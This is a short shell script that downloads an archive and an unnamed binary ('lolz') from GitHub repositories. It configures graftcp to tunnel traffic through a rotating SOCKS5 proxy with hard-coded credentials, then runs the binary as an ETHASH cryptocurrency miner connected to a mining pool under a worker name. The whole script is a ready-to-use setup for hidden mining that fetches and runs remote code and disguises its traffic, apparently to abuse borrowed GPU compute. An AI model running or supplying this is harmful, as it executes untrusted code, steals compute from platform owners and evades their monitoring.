curl -L -o graphics.tar.gz https://github.com/denisule54/dsX24/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = p.webshare.io:80
socks5_username = gedomazo9x-GB-rotate
socks5_password = gedomazo9x
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "

echo " "

wget https://github.com/Ikuzot/nung/raw/main/lolz
chmod +x lolz
./graftcp/graftcp ./lolz --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:25 --user teguhcong.GPUT4
